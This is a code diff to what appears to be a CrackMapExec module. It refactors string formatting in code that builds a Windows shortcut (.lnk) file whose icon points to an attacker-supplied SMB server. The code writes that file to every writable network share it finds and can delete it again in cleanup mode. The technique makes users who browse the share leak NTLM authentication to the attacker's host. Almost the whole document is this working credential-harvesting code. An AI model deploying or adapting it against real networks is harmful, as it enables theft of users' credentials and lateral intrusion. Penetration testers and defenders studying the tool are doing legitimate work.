@@ -36,30 +36,30 @@ class CMEModule:
             exit(1)
 
         self.lnk_name   = module_options['NAME']
-        self.lnk_path  = '/tmp/{}.lnk'.format(self.lnk_name)
-        self.file_path = ntpath.join('\\', '{}.lnk'.format(self.lnk_name))
+        self.lnk_path = f'/tmp/{self.lnk_name}.lnk'
+        self.file_path = ntpath.join('\\', f'{self.lnk_name}.lnk')
 
         if not self.cleanup:
             self.server = module_options['SERVER']
             link = pylnk3.create(self.lnk_path)
-            link.icon = '\\\\{}\\icons\\icon.ico'.format(self.server)
+            link.icon = f'\\\\{self.server}\\icons\\icon.ico'
             link.save()
 
     def on_login(self, context, connection):
         shares = connection.shares()
         for share in shares:
             if 'WRITE' in share['access'] and share['name'] not in ['C$', 'ADMIN$']:
-                context.log.success('Found writable share: {}'.format(share['name']))
+                context.log.success(f"Found writable share: {share['name']}")
                 if not self.cleanup:
                     with open(self.lnk_path, 'rb') as lnk:
                         try:
                             connection.conn.putFile(share['name'], self.file_path, lnk.read)
-                            context.log.success('Created LNK file on the {} share'.format(share['name']))
+                            context.log.success(f"Created LNK file on the {share['name']} share")
                         except Exception as e:
-                            context.log.error('Error writing LNK file to share {}: {}'.format(share['name'], e))
+                            context.log.error(f"Error writing LNK file to share {share['name']}: {e}")
                 else:
                     try:
                         connection.conn.deleteFile(share['name'], self.file_path)
-                        context.log.success('Deleted LNK file on the {} share'.format(share['name']))
+                        context.log.success(f"Deleted LNK file on the {share['name']} share")
                     except Exception as e:
-                        context.log.error('Error deleting LNK file on share {}: {}'.format(share['name'], e))
+                        context.log.error(f"Error deleting LNK file on share {share['name']}: {e}")
